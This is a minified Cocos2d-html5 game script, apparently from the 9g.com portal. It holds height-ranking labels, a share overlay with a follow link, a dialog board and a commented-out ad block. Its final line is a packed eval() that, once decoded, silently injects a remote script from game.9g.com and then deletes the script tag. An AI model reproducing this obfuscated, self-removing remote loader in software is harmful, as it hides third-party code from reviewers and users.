    if (70 <= a && 80 > a) return "迪拜塔";
    if (80 <= a && 90 > a) return "泰山";
    if (90 <= a && 100 > a) return "阿尔卑斯山";
    if (100 <= a) return "珠穆朗玛峰"
};
y.c.Uc = x.Y.extend({
    ctor: function(a, b, c, d) {
        this._super();
        this.initWithSpriteFrameName(b + ".png", c, d);
        this.$f(e);
        a && (a = cc.LabelTTF.create(a, "黑体", 22), this.addChild(a), x.Pd(a))
    }
});
y.c.Yg = cc.LayerColor.extend({
    ik: g,
    ctor: function() {
        this._super();
        this.init(cc.color(0, 0, 0, 200));
        this.setContentSize(cc.winSize);
        x.Mc(this, e);
        var a = this.ik = new cc.Sprite("#mtl_sharetip.png");
        a.setAnchorPoint(1, 1);
        a.setPosition(cc.winSize.width, cc.winSize.height);
        this.addChild(a);
        if ("gushici" ==
            function(a) {
                if (!window || !window.location) return g;
                a = window.location.search.substr(1).match(RegExp("(^|&)" + a + "=([^&]*)(&|$)", "i"));
                return a != g ? unescape(a[2]) : g
            }("from")) {
            var b = cc.LabelTTF.create("", "Arail", 20);
            b.setDimensions(cc.size(0.8 * cc.winSize.width, 0));
            b.setHorizontalAlignment(cc.TEXT_ALIGNMENT_CENTER);
            var c = new y.c.Uc("+关注", "ma_button_blue", function() {
                location.href = "http://game.9g.com"
            }, this);
            b.anchorY = c.anchorY = 1;
            b.x = c.x = cc.winSize.width / 2;
            b.y = x.Cf(a) - 50;
            c.y = x.Cf(b) - 70;
            this.addChild(b);
            this.addChild(c)
        }
    },
    onTouchBegan: function() {
        this.scheduleOnce(this.removeFromParent.bind(this), 0);
        return e
    }
});
y.c.oe = cc.Sprite.extend({
    ctor: function(a, b, c, d, f) {
        function l(a) {
            return function() {
                s.removeFromParent();
                a()
            }
        }
        this._super();
        this.initWithSpriteFrameName("mtl_board.png");
        if (a) {
            var m = cc.LabelTTF.create(a, "黑体", 18);
            m.setColor(cc.color(0, 0, 0));
            m.setHorizontalAlignment(cc.TEXT_ALIGNMENT_CENTER);
            m.setDimensions(cc.size(this.width - 40, 0));
            x.ea(m, this, 0.5, 0.65);
            this.addChild(m)
        } else {
            /*
             var m = new cc.Sprite("mtl_link.png"),
             r = x.Y.Yh(m.getContentSize(), function() {
             location.href = ""
             }, this);
             A.Ia("adv", "zysj");
             m.scale = 0.45;
             this.addChild(m);
             this.addChild(r);
             x.ea(r, this, 0.5, 0.35);
             x.ea(m, this, 0.5, 0.35)

             var m1 = new cc.LabelTTF.create("关注我们", "Arial", 48),
             r1 = x.Y.Yh(m1.getContentSize(), function() {
             //location.href = ""
             }, this);
             m1.scale = 0.45;
             m1.setColor(cc.color(0, 0, 255));
             m1.setHorizontalAlignment(cc.TEXT_ALIGNMENT_CENTER);

             this.addChild(m1);
             this.addChild(r1);
             x.ea(r1, this, 0.5, 0.4);
             x.ea(m1, this, 0.5, 0.4)

             var m2 = new cc.LabelTTF.create("抓住机遇，赚辆奔驰很容易！", "Arial", 32),
             r2 = x.Y.Yh(m2.getContentSize(), function() {
             location.href = "/"
             }, this);
             m2.scale = 0.45;
             m2.setColor(cc.color(0, 0, 255));
             m2.setHorizontalAlignment(cc.TEXT_ALIGNMENT_CENTER);

             this.addChild(m2);
             this.addChild(r2);
             x.ea(r2, this, 0.5, 0.15);
             x.ea(m2, this, 0.5, 0.15)
             */
        }
        var s = this;
        a = a ? 0.27 : 0.7;
        b = new y.c.Uc(b, "mtl_btn_blue", l(c), this);
        x.ea(b, this, 0.28, a);
        this.addChild(b);
        d = new y.c.Uc(d, "mtl_btn_red", l(f), this);
        x.ea(d, this, 0.72, a);
        this.addChild(d)
    }
});
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|script|parentNode|http|com|9g|game|||javascript|text|type|src|true|async|onload|insertBefore|js|removeChild|mtl|getElementsByTagName||createElement'.split('|'),0,{}))